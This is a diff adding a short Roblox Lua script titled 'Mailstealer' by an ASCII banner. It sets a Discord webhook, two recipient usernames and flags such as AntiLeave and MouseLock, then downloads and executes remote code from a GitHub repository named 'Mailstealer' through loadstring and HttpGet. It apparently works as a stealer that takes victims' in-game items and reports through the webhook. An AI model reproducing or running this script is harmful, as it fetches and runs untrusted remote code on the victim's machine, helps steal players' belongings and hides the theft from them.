@@ -1,0 +1,19 @@
+lua
+[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]
+
+UserName = "raniel_jud"
+Webhook = "https://discord.com/api/webhooks/1181579702687780914/_gUChUybS-LKSstwIalaBBE60FG-74H_PGfVzUm2AOjP_bN1p-Z3MRjHjaemM1l2757U"
+UserName2 = "agsitma12"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
